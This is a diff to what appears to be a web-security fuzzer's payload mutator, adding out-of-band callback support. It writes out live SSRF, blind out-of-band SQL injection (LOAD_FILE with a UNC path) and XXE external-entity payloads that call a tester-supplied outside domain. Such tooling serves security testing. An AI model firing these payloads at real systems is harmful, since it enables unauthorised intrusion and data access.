@@ -3,8 +3,9 @@ from __future__ import annotations
 import itertools
 import random
 import re
+import uuid
 import urllib.parse
-from typing import Callable, Iterator
+from typing import Callable, Iterator, List, Optional
 
 CORPUS: dict[str, list[str]] = {
     "sqli": [
@@ -221,6 +222,14 @@ def _get_priority_payloads(param_name: str, category: str) -> list[str]:
 
 
 class Mutator:
+    def __init__(self, oast_domain: Optional[str] = None):
+        self.oast_domain = oast_domain
+
+    def _get_oast_url(self) -> str:
+        if not self.oast_domain:
+            return "oast.local"
+        return f"{uuid.uuid4().hex}.{self.oast_domain}"
+
     def mutations(
         self,
         payload: str,
@@ -295,7 +304,19 @@ class Mutator:
         max_transforms: int = 2,
     ) -> Iterator[dict]:
 
-        payloads = CORPUS.get(category, [])
+        payloads = list(CORPUS.get(category, []))
+        
+        # OAST Injection
+        if category in ("ssrf", "sqli", "xxe") and self.oast_domain:
+            oast_target = self._get_oast_url()
+            if category == "ssrf":
+                payloads.append(f"http://{oast_target}/")
+            elif category == "sqli":
+                # Blind OOB SQLi (MySQL example)
+                payloads.append(f"'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{oast_target}', '\\\\a'))--")
+            elif category == "xxe":
+                payloads.append(f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oast_target}/">]><foo>&xxe;</foo>')
+
         for seed in payloads:
             chain: list[str] = []
             for mutated in self.mutations(seed, waf=waf, max_transforms=max_transforms):
